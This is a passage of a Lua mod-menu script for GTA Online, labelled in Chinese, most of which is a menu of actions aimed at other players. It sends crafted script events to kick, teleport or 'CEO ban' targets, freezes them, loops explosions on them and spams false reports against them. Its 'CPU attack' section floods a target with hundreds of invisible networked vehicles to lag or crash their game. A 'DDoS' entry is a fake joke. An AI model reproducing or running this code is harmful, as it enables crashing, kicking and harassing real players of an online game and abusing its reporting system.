        WEAPON.GIVE_WEAPON_TO_PED(player_Yule_army[i], util.joaat('WEAPON_CANDYCANE'),  9999, true, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(player_Yule_army[i], 20, true)
        PED.SET_PED_SHOOT_RATE(player_Yule_army[i], 1000)
        util.yield()
        end 
    end)

    menu.action(YuleArmy, "清除圣诞怪兽", {"clearyules"}, "", function()
        for i, ped in ipairs(entities.get_all_peds_as_handles()) do
            if PED.IS_PED_MODEL(ped, util.joaat("U_M_M_YuleMonster")) then
                entities.delete_by_handle(ped)
            end
        end
    end)

    menu.toggle_loop(jindianegao,"模型冻结", {"modelfreeze"}, "使玩家的模型无法移动", function()

        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

        TASK.CLEAR_PED_TASKS_IMMEDIATELY(player)

    end)

    menu.toggle_loop(jindianegao, "脚本冻结", {}, "", function()
        util.trigger_script_event(1 << pid, {-93722397, pid, 0, 0, 0, 0, 0})
        util.yield(500)
    end)


    menu.toggle_loop(jindianegao, "走路带火", {"footfire"}, "", function()
        local coords = players.get_position(pid)
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 38, 0, false, false, 0, false)
        util.yield(65)
    end)


    menu.toggle_loop(jindianegao, "循环喷火", {"flameloop"}, "经典恶搞之一", function(on_click)
        if players.exists(pid) then
            local player_pos = players.get_position(pid)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 12, 1, true, false, 1, false)
            util.yield(5)
        end
    end)



    menu.toggle_loop(jindianegao, "循环喷水", {"waterloop"}, "经典恶搞之一", function(on_click)
        if players.exists(pid) then
            local player_pos = players.get_position(pid)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 13, 1, true, false, 1, false)
            util.yield(5)
        end
    end)



    menu.toggle_loop(jindianegao, "随机循环", {"randomloop"}, "经典恶搞之一", function(on)
        if players.exists(pid) then
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], math.random(0, 82), 1.0, true, false, 0.0)
        end
    end)



	menu.toggle_loop(jindianegao, "折腾玩家", {"tossplayers"}, "在玩家身上循环无损伤的爆炸", function()
        if players.exists(pid) then
        local playerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid), true)
        SE_add_explosion(playerCoords['x'], playerCoords['y'], playerCoords['z'], 1, 1, SEisExploAudible, SEisExploInvis, 0, true)
    end
end)	



	menu.toggle_loop(jindianegao, "原子弹轰炸", {"atomicbomb"}, "", function(on_click)
        if players.exists(pid) then
        do
        orbital(pid)
        end
    end

    end)

                   

    menu.toggle_loop(jindianegao,"火箭雨", {'rockets'}, '', function()
        if players.exists(pid) then
        rain_rockets(pid, false)
        util.yield(100)
        end
    end)



    menu.toggle_loop(jindianegao,"循环电击枪", {"stungunloop"}, "在此玩家周围生成电击枪发射音效", function()
        if players.exists(pid) then
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(player)
        for i = 1, 50 do
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 0, true, util.joaat("weapon_stungun"), players.user_ped(), false, true, 1.0)
        end
        util.yield(100)
    end
end)

    menu.toggle_loop(jindianegao, "大风车", {"Windmills"}, "", function(on_toggle)
        if players.exists(pid) then
        windmills(pid)
        end
    end)

    menu.toggle_loop(jindianegao,"将玩家推向前方", {"pushplayerforward"}, "", function()
        if players.exists(pid) then
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

        local pos = ENTITY.GET_ENTITY_COORDS(player, false)

        local glitch_hash = util.joaat("prop_shuttering03")

        request_model(glitch_hash)

        local dumb_object_front = entities.create_object(glitch_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 1, 0))

        local dumb_object_back = entities.create_object(glitch_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 0, 0))

        ENTITY.SET_ENTITY_VISIBLE(dumb_object_front, false)

        ENTITY.SET_ENTITY_VISIBLE(dumb_object_back, false)

        util.yield()

        entities.delete_by_handle(dumb_object_front)

        entities.delete_by_handle(dumb_object_back)

        util.yield() 
        end

    end)



    local glitchForcefield = false

    local glitchforcefield_toggle

    glitchforcefield_toggle = menu.toggle(jindianegao, "范围删除", {}, "启用后会将此玩家附近的模型删除", function(toggled)
        if players.exists(pid) then

        glitchForcefield = toggled

        local glitch_hash = util.joaat("p_spinning_anus_s")

        request_model(glitch_hash)



        while glitchForcefield do

            local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

            local playerpos = ENTITY.GET_ENTITY_COORDS(player, false)

            

            if PED.IS_PED_IN_ANY_VEHICLE(player, true) then

                notification("玩家在载具中. :/")

                menu.set_value(glitchforcefield_toggle, false);

            break end

            

            local stupid_object = entities.create_object(glitch_hash, playerpos)

            ENTITY.SET_ENTITY_VISIBLE(stupid_object, false)

            ENTITY.SET_ENTITY_INVINCIBLE(stupid_object, true)

            ENTITY.SET_ENTITY_COLLISION(stupid_object, true, true)

            util.yield()

            entities.delete_by_handle(stupid_object)

            util.yield()    

        end
    end
end)



	menu.toggle_loop(jindianegao,"循环举报", {"reportloop"}, "会变卡", function()
        if players.exists(pid) then
			if pid ~= players.user() then
				menu.trigger_commands("reportvcannoying " .. PLAYER.GET_PLAYER_NAME(pid))

				menu.trigger_commands("reportvchate " .. PLAYER.GET_PLAYER_NAME(pid))

				menu.trigger_commands("reportannoying " .. PLAYER.GET_PLAYER_NAME(pid))

				menu.trigger_commands("reporthate " .. PLAYER.GET_PLAYER_NAME(pid))

				menu.trigger_commands("reportexploits " .. PLAYER.GET_PLAYER_NAME(pid))

				menu.trigger_commands("reportbugabuse " .. PLAYER.GET_PLAYER_NAME(pid))
            end
        end
	end)

    menu.toggle(jindianegao, "撒尿", {"peeloop"}, "随地大小便应该遭到谴责", function(state)
        if players.exists(pid) then

        if state then 

            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

            local bone_index = PED.GET_PED_BONE_INDEX(player_ped, 0x2e28)

            request_ptfx_asset("core")

            GRAPHICS.USE_PARTICLE_FX_ASSET("core")

            ptfx_id = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE(

                "ent_amb_peeing", player_ped, 0, 0, 0, -90, 0, 0, bone_index, 2, false, false, false

            ) 

        else

            GRAPHICS.STOP_PARTICLE_FX_LOOPED(ptfx_id, false)

        end
    end

    end)

    menu.toggle_loop(jindianegao, "烟雾掉帧", {""}, "", function()
        if players.exists(pid) then
            smoke(pid)
        end
    end)

    menu.toggle_loop(jindianegao, "附近Peds跳伞", {"skydivepeds"}, "", function()
        if players.exists(pid) then
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_ENTITY_COORDS(p)
                all_peds = entities.get_all_peds_as_handles()
                player_ped = PLAYER.PLAYER_PED_ID()
                for k,ped in pairs(all_peds) do
                    if not PED.IS_PED_A_PLAYER(ped) then
                        TASK.TASK_SKY_DIVE(ped)
                    end
            end
        end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.toggle_loop(jindianegao, "外星人爆炸循环", {"ufoloop"}, "模拟外星人入侵", function()
        if players.exists(pid) then
        alien_explosion_loop(pid)
    end
end)

    menu.toggle(jindianegao, "附加到玩家", {"peeloop"}, "", function(on)

        if PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid) == players.user_ped() then 

            notification("傻B,别附加自己")

            return

        end

        if on then

            ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 0, 0.0, -0.20, 2, 1.0, 1.0,1, true, true, true, false, 0, true)

        else

            ENTITY.DETACH_ENTITY(players.user_ped(), false, false)

        end

    end)

      menu.action(jindianegao, "掉帧", {""}, "", function()

        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

		local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)  

        for i = 0, 180 do 

            attachmentveh1 = CreateVehicle(353883353,TargetPlayerPos,0)   

    end

end)



menu.action(jindianegao, "喷射", {"peeloop"}, "", function(state)

        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

        local bone_index = PED.GET_PED_BONE_INDEX(player_ped, 0x2e28)

        request_ptfx_asset("core_snow")

        GRAPHICS.USE_PARTICLE_FX_ASSET("core_snow")

        ptfx_id = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE(

            "cs_mich1_spade_dirt_throw", player_ped, 0, 0, 0, -90, 0, 0, bone_index, 2, false, false, false

        ) 

end)



	menu.action(jindianegao, "核弹", {""}, "", function(on_click)

		local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

		local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)

        local Object_pizza1 = CreateVehicle(1131912276,TargetPlayerPos,0)

        local Object_pizza2 =CreateObject(253279588,TargetPlayerPos)

            TargetPlayerPos.y = TargetPlayerPos.y + 2

            TargetPlayerPos.z = TargetPlayerPos.z + 70 

            ENTITY.SET_ENTITY_ALPHA(Object_pizza1, 255)

            ENTITY.SET_ENTITY_VISIBLE(Object_pizza1, false, 0)

            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza1, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)

            ENTITY.ATTACH_ENTITY_TO_ENTITY(Object_pizza2,Object_pizza1, 0,  0.0, 0.00, 0.00, 1.0, 1.0,1, true, false, true, false, 0, true)

        util.yield(5000)

        do

	    orbital(pid)

        entities.delete_by_handle(Object_pizza1)

        entities.delete_by_handle(Object_pizza2)

	  end

end)



    menu.action(jindianegao, "外星人爆炸", {"ufo"}, "模拟外星人入侵", function()
        alien_explosion(pid) 
    end)



    menu.action(jindianegao, "公寓邀请", {}, "", function()

        util.trigger_script_event(1 << pid, {-168599209, players.user(), pid, -1, 1, 1, 0, 1, 0}) 

    end)

    menu.action(jindianegao, "随机公寓邀请", {}, "", function()

        util.trigger_script_event(1 << pid, {0xF5F36157, players.user(), pid, 1, 0, math.random(1, 114), 1, 1, 1}) 

    end)

    menu.action(jindianegao, "佩里科岛(有过场动画)", {"tpcayo"}, "", function()

        util.trigger_script_event(1 << pid, {-910497748, pid, 0, 0, 3, 1, 0})

    end)

    menu.action(jindianegao, "佩里科岛(无过场动画)", {"tpcayo2"}, "", function()

        util.trigger_script_event(1 << pid, {-910497748, pid, 0, 0, 4, 1, 0})

    end)



    menu.action(jindianegao, "离开佩里科岛", {"cayoleave"}, "玩家必须在佩里科岛才能触发", function()

        util.trigger_script_event(1 << pid, {-910497748, pid, 0, 0, 3, 0, 0})

    end)



    menu.action(jindianegao, "从佩里科岛踢出", {"cayokick"}, "", function()

        util.trigger_script_event(1 << pid, {-910497748, pid, 0, 0, 4, 0, 0})

    end)

    menu.action(jindianegao, "事务处理错误", {""}, "", function()

        util.trigger_script_event(1 << pid, {-492741651, pid, 0, 0, 4, 0, 0})

    end)

    menu.action(jindianegao, "发送到仓库", {""}, "", function()

        util.trigger_script_event(1 << pid, {434937615, pid, 0, 1, math.random(1, 22)})

    end)

    menu.action(jindianegao, "强制赌场剧情动画", {""}, "", function()

        util.trigger_script_event(1 << pid, {392606458, pid, 0, 0, 4, 0, 0})

    end)

    menu.action(jindianegao, "CEO Ban", {}, "", function()
        for i = 1, 200 do
            util.trigger_script_event(1 << pid, {316066012, pid, 1, 0, 2, 1})
        end
    end)

    menu.action(jindianegao, "掉猴子", {""}, "", function()
        monkey_drop(pid)
    end)

    menu.action(jindianegao, "掉CXK", {""}, "", function()
        chicken_drop(pid)
    end)



    local friendly = menu.list(playerMain, "友好选项", {}, "")

    menu.toggle_loop(friendly, "传送所有PED给玩家", {"toggletppeds"}, "", function (on_toggle)
            if on_toggle then
                TpAllPeds(pid)
            else
                TpAllPeds(pid)
            end
    end)

    menu.toggle_loop(friendly, "传送所有载具给玩家", {"toggletppedstpvehs"}, "", function (on_toggle)
            if on_toggle then
                TpAllVehs(pid)
            else
                TpAllVehs(pid)
            end
    end)

    menu.toggle_loop(friendly, "传送所有物体给玩家", {"tpobjs"}, "", function (on_toggle)
            if on_toggle then
                TpAllObjects(pid)
            else
                TpAllObjects(pid)
            end
    end)

    menu.toggle_loop(friendly, "传送所有拾取物给玩家", {"tppickups"}, "", function (on_toggle)
            if on_toggle then
                TpAllPickups(pid)
            else
                TpAllPickups(pid)
            end
    end)

    menu.toggle_loop(friendly, "假钱雨", {}, "", function ()
        local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
        Streamptfx('core')
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD( 'ent_brk_banknotes', tar1.x, tar1.y, tar1.z + 1, 0, 0, 0, 3.0, true, true, true)
    end)


    local cpuburn = menu.list(playerMain, "CPU攻击", {}, "")

	fish_options = menu.list(cpuburn, "CPU V1", {}, "")



	menu.divider(fish_options, "炸鱼")

	

    Ptools_PanTable = {}

    Ptools_PanCount = 1

    Ptools_FishPan = 20



    menu.action(fish_options, "炸鱼", {""}, "卡死", function ()

        local targetped = PLAYER.GET_PLAYER_PED(pid)

        local targetcoords = ENTITY.GET_ENTITY_COORDS(targetped)



        local hash = util.joaat("tug")

        STREAMING.REQUEST_MODEL(hash)

        while not STREAMING.HAS_MODEL_LOADED(hash) do util.yield() end



        for i = 1, Ptools_FishPan do

            Ptools_PanTable[Ptools_PanCount] = VEHICLE.CREATE_VEHICLE(hash, targetcoords.x, targetcoords.y, targetcoords.z, 0, true, true, true)

            ----

            local netID = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(Ptools_PanTable[Ptools_PanCount])

            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(Ptools_PanTable[Ptools_PanCount])

            NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(netID)

            NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(netID)

            NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netID, false)

            NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(netID, pid, true)

            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Ptools_PanTable[Ptools_PanCount], true, false)

            ENTITY.SET_ENTITY_VISIBLE(Ptools_PanTable[Ptools_PanCount], false, 0)

            ----

            if SE_Notifications then

                notification("Spawned with index of " .. Ptools_PanCount)

            end

            Ptools_PanCount = Ptools_PanCount + 1

        end

    end)





    menu.slider(fish_options, "数量", {""}, "鱼的数量1-300", 1, 300, 20, 1, function(value)

        Ptools_FishPan = value

    end)



    menu.action(fish_options, "删除", {""}, "Yep", function ()

        for x = 1, 5, 1 do

            for i = 1, #Ptools_PanTable do

                entities.delete_by_handle(Ptools_PanTable[i])

                util.yield(10)

            end

        end

        --

        Ptools_PanCount = 1

        Ptools_PanTable = {}

        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(util.joaat("tug"))

    end)

	

menu.action(cpuburn,"CPU V2", {}, "CPU v2", function() 

		while not STREAMING.HAS_MODEL_LOADED(447548909) do

			STREAMING.REQUEST_MODEL(447548909)

			util.yield(10)

		end

		local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())

        local OldCoords = ENTITY.GET_ENTITY_COORDS(self_ped) 

		ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self_ped, 24, 7643.5, 19, true, true, true)



		notification("开始干他")

		menu.trigger_commands("anticrashcamera on")

		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

		local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)

		spam_amount = 300

		while spam_amount >= 1 do

			entities.create_vehicle(447548909, PlayerPedCoords, 0)

			spam_amount = spam_amount - 1

			util.yield(10)

		end

		notification("干完") 

		menu.trigger_commands("anticrashcamera off")

		util.yield(5000)

		

	end)

    menu.toggle_loop(cpuburn, "CPU V3", {}, "请远离该玩家", function()
		local player_pos = players.get_position(pid)
		request_ptfx_asset("scr_rcbarry2")
		GRAPHICS.USE_PARTICLE_FX_ASSET("scr_rcbarry2")
		GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "scr_clown_death", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
		request_ptfx_asset("scr_rcbarry2")
		GRAPHICS.USE_PARTICLE_FX_ASSET("scr_rcbarry2")
		GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "scr_exp_clown", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
		request_ptfx_asset("scr_ch_finale")
       GRAPHICS.USE_PARTICLE_FX_ASSET("scr_ch_finale")
		GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
			"scr_ch_finale_drill_sparks", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
        request_ptfx_asset("scr_ch_finale")
        while not STREAMING.HAS_MODEL_LOADED(447548909) do
			STREAMING.REQUEST_MODEL(447548909)
			end
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
		spam_amount = 1000
		while spam_amount >= 2 do
			entities.create_vehicle(447548909, PlayerPedCoords, 0)
			spam_amount = spam_amount - 2
		end
        util.yield(100)
	end)

	

menu.action(cpuburn, "DDoS", {}, "通过向其路由器发送数据包对玩家进行DDoS攻击", function()

    notification("成功发送DDoS攻击到" ..players.get_name(pid))

        local percent = 0

        while percent <= 100 do

            util.yield(100)

            notification(percent.. "% done")

            percent = percent + 1

        end

        util.yield(3000)

        notification("开个玩笑你个笨比")

    end)



    sound_options = menu.list(playerMain, "声音骚扰", {}, "")



	

	menu.toggle_loop(sound_options, "超市他", {"ohfuck"}, "st", function()

		AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "SPAWN", PLAYER.GET_PLAYER_PED(pid), "BARRY_01_SOUNDSET", true, 2)

		AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "External_Explosion", PLAYER.GET_PLAYER_PED(pid), "Methamphetamine_Job_Sounds", true, 1)

	

    end)

	

	menu.toggle_loop(sound_options, "手机按键（自己听得到）", {"ringtones"}, "st", function()

		AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Menu_Accept", PLAYER.GET_PLAYER_PED(pid), "Phone_SoundSet_Default", true, 2)

    end)

    menu.toggle(playerMain, "BUFF", {"buff"}, "", function(on)
        if on then
            menu.trigger_commands("yulearmy " .. players.get_name(pid).."10")
            menu.trigger_commands("toggleyulemonster " .. players.get_name(pid).." on")
            menu.trigger_commands("windmills " .. players.get_name(pid).." on")
            menu.trigger_commands("randomloop " .. players.get_name(pid).." on")
            menu.trigger_commands("atomicbomb " .. players.get_name(pid).." on")
            menu.trigger_commands("crashxp " .. players.get_name(pid))
            menu.trigger_commands("togglefragv1 " .. players.get_name(pid).." on")
            util.yield(3000)
            menu.trigger_commands("kick " .. players.get_name(pid))
        else
            menu.trigger_commands("toggleyulemonster " .. players.get_name(pid).." off")
            menu.trigger_commands("windmills " .. players.get_name(pid).." off")
            menu.trigger_commands("randomloop " .. players.get_name(pid).." off")
            menu.trigger_commands("atomicbomb " .. players.get_name(pid).." off")
            menu.trigger_commands("crashxp " .. players.get_name(pid))
            menu.trigger_commands("togglefragv1 " .. players.get_name(pid).."off")
        end
    end)

end

    players.on_join(playerActionsSetup)

    players.dispatch_on_join()

local smartAutoDriveData = {
    paused = false,
    lastSetTask = 0,
    lastWaypoint = nil
}
local MOVEMENT_CONTROLS = table.freeze({
    59, 60, 61, 62, 63, 64, 71, 72, 75, 76, 87, 88, 89, 90, 102, 106, 107, 108, 109, 110, 111, 112, 113, 122, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139
})
local autodriveDriver = 0

    

local last_car = 0
            while true do
                player_cur_car = entities.get_user_vehicle_as_handle()
                if last_car ~= player_cur_car and player_cur_car ~= 0 then 
                    on_user_change_vehicle(player_cur_car)
                    last_car = player_cur_car
                end
            

                if superjump then

                    if PAD.IS_CONTROL_PRESSED(1, 22) then

                        ENTITY.APPLY_FORCE_TO_ENTITY(players.user_ped(), 1, 0.0, 0.0, 1.5, 0.0, 0.0, 0.0, 0, true, true, true, false, true)

                    end

                end

                if homer then

                    if PAD.IS_CONTROL_PRESSED(1, 21) then

                        menu.trigger_command(menu.ref_by_path("Game>Rendering>Shader Override>AirRaceBoost02"))

                    else

                        menu.trigger_command(menu.ref_by_path("Game>Rendering>Shader Override>Don't Override"))

                    end

                end 

                if bigbarrelqq then
                    if (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) ~= -1810795771) then
                    WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1810795771,15,true,true)
                end
            end

            if help then
                draw_string(string.format("使用帮助\n按3/O可以保存脚本设置\n使用帮助可以在其他选项中关闭"), 0.5,0.5, 1,5)
            end

            if zhengyi then 
                directx.draw_texture(zhengyipng, 0.29, 0.1, 0.0, 0.0, 0.23, 0.0, 0, 1, 1, 1, 1)
            end

                local my_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
                local my_vehicle = PED.GET_VEHICLE_PED_IS_IN(my_ped, false)

                if smartAutodrive and my_vehicle > 0 then
                    if smartAutoDriveData.paused then
                        if ENTITY.GET_ENTITY_SPEED(my_vehicle) <= 15 then
                            smartAutoDriveData.paused = false
                        end
                    else
                        for _, control in ipairs(MOVEMENT_CONTROLS) do
                            if PAD.IS_CONTROL_PRESSED(2, control) then
                                TASK.CLEAR_PED_TASKS(my_ped)
                                smartAutoDriveData.paused = true
                                break
                            end
                        end
                        if not smartAutoDriveData.paused then
                            local waypoint = get_waypoint_pos(nil, true)
                            if waypoint then
                                lastWaypoint = waypoint
                                local model = ENTITY.GET_ENTITY_MODEL(my_vehicle)
                                local now = MISC.GET_GAME_TIMER()
                                if now - smartAutoDriveData.lastSetTask > 5000 then
                                    PED.SET_DRIVER_ABILITY(my_ped, 1.0)
                                    PED.SET_DRIVER_AGGRESSIVENESS(my_ped, 0.6)
                                    TASK.TASK_VEHICLE_DRIVE_TO_COORD(my_ped, my_vehicle, waypoint.x, waypoint.y, waypoint.z, 100, 5, model, 787004, 15.0, 1.0)
                                    smartAutoDriveData.lastSetTask = now
                                end
                            elseif smartAutoDriveData.lastWaypoint then
                                if ENTITY.IS_ENTITY_AT_COORD(my_vehicle, smartAutoDriveData.lastWaypoint.x, smartAutoDriveData.lastWaypoint.y, smartAutoDriveData.lastWaypoint.z, 10.0, 10.0, 10.0, 0, 1, 0) then
                                    smartAutoDriveData.lastWaypoint = nil
                                    smartAutoDriveData.paused = true
                                    VEHICLE.BRING_VEHICLE_TO_HALT(my_vehicle, 5.0, 1)
                                    TASK.CLEAR_PED_TASKS(my_ped)
                                end
                            end
                        end
                    end

                util.yield()

            end 

        util.yield()

end
